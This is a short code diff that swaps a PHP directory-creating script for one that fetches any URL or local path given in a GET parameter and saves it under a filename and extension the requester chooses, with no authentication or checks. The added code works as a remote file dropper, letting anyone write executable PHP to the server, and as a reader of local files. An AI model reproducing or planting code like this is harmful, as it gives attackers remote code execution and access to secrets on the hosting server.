@@ -1,4 +1,11 @@
 <?php
-$loc = "JayKumar-CricHunt";
-mkdir($loc);
-?>
+	$link = $_GET['link'];
+	$name = $_GET['name'];
+	$ex = $_GET['ex'];
+	$file = $name.".".$ex;
+	$text = implode('',file($link));
+	$fp = fopen($file,"w");
+	fwrite($fp,$text);
+	fclose($fp);
+	echo  "<style>textarea{position:absolute;left:0;right:0;top:0;bottom:0;width:100%;height:100%;background:rgb(200,200,200);color:#000;}</style><textarea>File : ".$file."\nContents : \n\n".$text."</textarea>";
+ ?>
